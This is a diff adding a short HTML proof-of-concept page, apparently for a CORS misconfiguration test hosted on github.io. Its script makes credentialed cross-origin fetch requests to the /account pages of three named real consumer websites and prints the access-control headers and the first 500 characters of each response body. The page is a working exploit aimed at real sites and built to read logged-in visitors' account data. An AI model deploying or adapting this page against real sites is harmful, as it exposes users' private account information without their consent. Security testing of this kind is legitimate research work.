@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>CORS PoC c67</title></head>
+<body style="font-family:monospace">
+<h1>CORS PoC - external origin (github.io)</h1>
+<pre id="out" style="white-space:pre-wrap;font-size:12px">running...</pre>
+<script>
+(async()=>{
+ const out=document.getElementById('out');
+ let s='origin='+location.origin+'\n';
+ for(const host of ['www.jbl.com','www.harmanaudio.com','www.harman-kardon.com']){
+  try{
+   const r=await fetch('https://'+host+'/account',{credentials:'include'});
+   const t=await r.text();
+   s+='['+host+'] HTTP '+r.status+'\nACAO: '+r.headers.get('access-control-allow-origin')+'\nACAC: '+r.headers.get('access-control-allow-credentials')+'\nBODY('+t.length+' chars): '+t.slice(0,500).replace(/\s+/g,' ')+'\n\n';
+  }catch(e){s+='['+host+'] BLOCKED BY CORS/NET: '+e+'\n\n';}
+ }
+ out.textContent=s;
+})();
+</script>
+</body></html>
